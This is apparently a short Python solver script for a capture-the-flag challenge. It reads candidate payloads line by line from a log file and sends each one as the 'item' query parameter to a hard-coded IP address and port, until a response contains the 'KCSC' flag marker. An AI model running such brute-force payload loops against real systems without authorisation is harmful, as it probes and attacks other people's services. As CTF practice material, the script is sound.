#!python3
from urllib.parse import urlencode
import requests
import urllib.parse
sess= requests.Session()
url="http://139.180.134.15:20101/?item="
a_file = open("./127.0.0.1-1650990594971.log")
lines = a_file.readlines()
i=0
for line in lines:
    r=sess.get(url+urllib.parse.quote(line, safe=""),)
    if "KCSC" in r.text:
        print(f"FOUND AT {i} AKA {line} : {r.text}")
        break
    else:
        print(f"[-] Trying {i}")
        i+=1